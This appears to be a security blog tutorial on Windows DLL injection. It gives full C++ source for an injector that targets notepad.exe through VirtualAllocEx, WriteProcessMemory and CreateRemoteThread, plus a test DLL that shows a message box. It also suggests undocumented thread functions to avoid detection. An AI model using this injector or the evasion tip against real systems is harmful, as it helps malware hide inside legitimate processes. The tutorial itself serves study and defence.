---
title: DLL Injection
date: 2021-09-26
tags:
    - process-injection
    - windows
    - c++
toc: true
header:
    teaser: /assets/images/dll-injection/cover.png
    overlay_image: /assets/images/dll-injection/cover.png
    overlay_filter: 0.6
---

# Introduction
DLL Injection is a process injection technique that allows the attacker to load a DLL file in the virtual address space of another process. By loading a DLL file in the context of another process, adversaries can mask their code under a legitimate process and possibly elevate privileges or evade detection. This is usually achieved by writing the path to a DLL file on the virtual address space of another process, and loads it by invoking a new thread.

# Implementation
First of all we have to choose a target process. This can be done by searching through the running processes using Windows API functions like `CreateToolhelp32Snapshot`, `Process32First` and `Process32Next`.
- `CreateToolhelp32Snapshot` used to get a snapshot of all the running processes.
- `Process32First` used to get the first entry of the processes snapshot.
- `Process32Next` used to get the next entry of the processes snapshot (useful for iterating through the processes snapshot).

Once the target process has been found, we can get a handle to it by calling `OpenProcess`. After that, we have to allocate enough memory space in order to write the path to the DLL file. This can be achieved by calling the Windows API function `VirtualAllocEx`. The next step will be to write the path of the DLL file in the target process by calling the `WriteProcessMemory`. Finally we have to call the `CreateRemoteThread` in order to create a new remote thread in the target process and make sure that it loads the DLL module by calling the `LoadLibraryA` function.

## Steps
1. [Create a DLL file to inject in the target process.](#1-create-a-dll-file-to-inject-in-the-target-process)
2. [Get a handle to the target process.](#2-get-a-handle-to-the-target-process)
3. [Allocate enough memory space in the target process in order to copy the path of DLL file.](#3-allocate-enough-memory-space-in-the-target-process-in-order-to-copy-the-path-of-dll-file)
4. [Copy the path of the DLL file in the previously allocated space.](#4-copy-the-path-of-the-dll-file-in-the-previously-allocated-space)
5. [Create a remote thread in the target process and ensure that it loads the DLL module.](#5-create-a-remote-thread-in-the-target-process-and-ensure-that-it-loads-the-dll-module)

### 1. Create a DLL file to inject in the target process.
The code below constructs a very simple DLL file that shows up a message box. All the logic resides in the `DllMain` function. That's because this is the entry point for every DLL module. In other words this is the function always gets called once the DLL module has been loaded. Notice that our code resides under the `DLL_PROCESS_ATTACH` case. This important because `DLL_PROCESS_ATTACH` condition is true, when the DLL is started up as a result of a call to `LoadLibrary`.

> More about DllMain function [here](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain)

````
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <WinUser.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxW(NULL, L"OK", L"Injection Successfull", MB_ICONINFORMATION);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
````
### 2. Get a handle to the target process.
Now that we have our DLL file, we can focus on the injection part. First we need to get a handle to the target process. For the purpose of this tutorial I choose `notepad.exe` as target process. To achieve this, we have to call the `CreateToolhelp32Snapshot` in order to get a snapshot of the all the currently running processes. Then we can iterate through the snapshot using the `Process32First` and `Process32Next` functions until we found the target process(notepad.exe). Finally we have to call the `OpenProcess` in order to get a handle to it.

````
const WCHAR* processName = L"notepad.exe";
const char* dllLocation = "C:\\Users\\George\\source\\repos\\DllInjection\\x64\\Debug\\BadDll.dll";
size_t dllLocationSize = strlen(dllLocation);

HANDLE processSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

if (processSnap == INVALID_HANDLE_VALUE) {
    std::cout << "[-] Could not retrieve process snapshot. Error code: " << GetLastError();
    return -1;
}
std::cout << "[+] Process snapshot retrieved successfully." << std::endl;

PROCESSENTRY32 processEntry;
processEntry.dwSize = sizeof(PROCESSENTRY32);

if (!Process32First(processSnap, &processEntry)) {
    std::cout << "[-] Could not iterate through process snapshot. Error code: " << GetLastError();
    return -1;
}

do {
    if (!wcscmp(processEntry.szExeFile, processName)) {
        std::wcout << "[+] Target process found: " << processEntry.szExeFile << " (" << processEntry.th32ProcessID << ")" << std::endl;
        break;
    }
} while (Process32Next(processSnap, &processEntry));

CloseHandle(processSnap);

if (wcscmp(processEntry.szExeFile, processName)) {
    std::cout << "[-] Target process not found.";
    return -1;
}

HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processEntry.th32ProcessID);
if (targetProcess == NULL) {
    std::cout << "[-] Could not get a process handle. Error code: " << GetLastError();
    return -1;
}
std::cout << "[+] Process handle retrieved successfully." << std::endl;
````

### 3. Allocate enough memory space in the target process in order to copy the path of DLL file.
The next step would be to allocate enough memory space in the target process in order to copy the path of the DLL file. Because the target process is a remote process, in order to allocate memory space we have to call the `VirtualAllocEx` function.

> `VirtualAllocEx` used to allocate memory in a remote process.

As you can see the first parameter is the handle to the target process, the second one is `NULL` because we don't want to specify a starting address, so we just let Windows to determine where to allocate the region, the third one is the size of the string that contains the path to the DLL file and the last one is the memory allocation type.

> More about `VirtualAllocEx` [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)

````
LPVOID dllPath = VirtualAllocEx(targetProcess, NULL, dllLocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (dllPath == NULL) {
    std::cout << "[-] Could not allocate memory. Error code: " << GetLastError();
    return -1;
}
std::cout << "[+] Menory allocated successfully." << std::endl;
````

### 4. Copy the path of the DLL file in the previously allocated space.
Once the memory space has been allocated, all we need to do is to copy the path of the DLL file. Because we want to write in memory space of a remote process, we have to call the `WriteProcessMemory` function.

> `WriteProcessMemory` is used to write to memory space of a remote process.

So, the first parameter would be the handle to the target process, the second one would be the pointer to the allocated space, the third one would be the string which contains the path to the DLL file and the fourth one would be the size of the string that contains the path to the DLL file. The last parameter is optional, in case that you want to receive number of bytes transferred into the specified process. In this case we don't need this, so we can set this to `NULL`.

> More about WriteProcessMemory [here](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

````
if (!WriteProcessMemory(targetProcess, dllPath, dllLocation, dllLocationSize, NULL)) {
    std::cout << "[-] Could not inject dll. Error code: " << GetLastError();
    return -1;
}

std::cout << "[+] DLL injected successfully." << std::endl;
````

### 5. Create a remote thread in the target process and ensure that it loads the DLL module.
The last step would be to execute our DLL file in the context of the target process. To achieve this, the only thing that we have to do is to create a remote thread in the target process and make sure that once the gets started it will load our DLL module. In order to load the DLL module, we need to make the target process to call the `LoadLibraryA`. Since `LoadLibraryA` is an exported function, we need to get the address to it. We can easily do this by calling the `GetProcAddress`. `GetProcAddress` takes two parameters: A handle to the DLL module that contains the exported function, and a string that contains the function name that we want to retrieve the address of. `LoadLibraryA` is exported by `kernel32.dll` module, so all we need is a handle to `kernel32.dll` module. That's why we are calling `GetModuleHandle`.

> More about GetProcAddress [here](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
<br>
More about GetModuleHandle [here](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)

Now that we have the address of the `LoadLibraryA` function the last step would be to start a new thread in our target process and make sure that it calls the `LoadLibraryA` function in order to load our DLL module. To achieve this, we have to call `CreateRemoteThread`. This function takes seven parameters:
1. A handle to the target process.
2. This one would be the security attributes, but since we don't have any we can set this to `NULL`.
3. The initial stack size. In our case this is 0, which instructs Windows to use the default size.
4. A pointer to the appilication-defined function that we want our remote process to execute once the thread is started. That will be the address of the `LoadLibraryA` function.
5. A pointer to the parameter that we want to pass in `LoadLibraryA`. `LoadLibraryA` gets only one parameter, which is the path to the DLL module that we want to load. So we have to set this one with the path to the DLL file.
6. This one controls the creation of the thread. We should set this to 0 in order to instruct the thread to start immediately.
7. The last one is a pointer to a variable that we want to retrieve the thread identifier. In our case we don't need this, so we can set this to `NULL`.

> More about CreateRemoteThread [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)

````
LPTHREAD_START_ROUTINE loadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
if (!loadLibraryAddress) {
    std::cout << "[-] Could not get the address of LoadLibrary function.";
}
HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, loadLibraryAddress, dllPath, 0, NULL);
if (remoteThread == NULL) {
    std::cout << "[-] Could create new thread. Error code: " << GetLastError();
    return -1;
}

std::cout << "[+] New thread created successfully";
````

### Notes
- Instead of `CreateRemoteThread` we could use `NtCreateThreadEx` or `RtlCreateUserThread` undocumented functions in order to avoid detection.

## Source code
### dllmain.cpp

````
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <WinUser.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MessageBoxW(NULL, L"OK", L"Injection Successfull", MB_ICONINFORMATION);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
````

### DllInjection.cpp

````
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

int main()
{
    const WCHAR* processName = L"notepad.exe";
    const char* dllLocation = "C:\\Users\\George\\source\\repos\\DllInjection\\x64\\Debug\\BadDll.dll";
    size_t dllLocationSize = strlen(dllLocation);

    HANDLE processSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (processSnap == INVALID_HANDLE_VALUE) {
        std::cout << "[-] Could not retrieve process snapshot. Error code: " << GetLastError();
        return -1;
    }
    std::cout << "[+] Process snapshot retrieved successfully." << std::endl;

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(processSnap, &processEntry)) {
        std::cout << "[-] Could not iterate through process snapshot. Error code: " << GetLastError();
        return -1;
    }

    do {
        if (!wcscmp(processEntry.szExeFile, processName)) {
            std::wcout << "[+] Target process found: " << processEntry.szExeFile << " (" << processEntry.th32ProcessID << ")" << std::endl;
            break;
        }
    } while (Process32Next(processSnap, &processEntry));

    CloseHandle(processSnap);

    if (wcscmp(processEntry.szExeFile, processName)) {
        std::cout << "[-] Target process not found.";
        return -1;
    }

    HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, processEntry.th32ProcessID);
    if (targetProcess == NULL) {
        std::cout << "[-] Could not get a process handle. Error code: " << GetLastError();
        return -1;
    }
    std::cout << "[+] Process handle retrieved successfully." << std::endl;

    LPVOID dllPath = VirtualAllocEx(targetProcess, NULL, dllLocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (dllPath == NULL) {
        std::cout << "[-] Could not allocate memory. Error code: " << GetLastError();
        return -1;
    }
    std::cout << "[+] Menory allocated successfully." << std::endl;

    if (!WriteProcessMemory(targetProcess, dllPath, dllLocation, dllLocationSize, NULL)) {
        std::cout << "[-] Could not inject dll. Error code: " << GetLastError();
        return -1;
    }

    std::cout << "[+] DLL injected successfully." << std::endl;

    LPTHREAD_START_ROUTINE loadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (!loadLibraryAddress) {
        std::cout << "[-] Could not get the address of LoadLibrary function.";
    }
    HANDLE remoteThread = CreateRemoteThread(targetProcess, NULL, 0, loadLibraryAddress, dllPath, 0, NULL);
    if (remoteThread == NULL) {
        std::cout << "[-] Could create new thread. Error code: " << GetLastError();
        return -1;
    }

    /*
    * We could implement DLL injection through NtCreateThreadEx or RtlCreateUserThread.
    */

    std::cout << "[+] New thread created successfully";

}
````

# References
- [Ten process injection techniques: A technical survey of common and trending process injection techniques](https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [Process Injection: Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001/)
- [DLL Injection](https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection)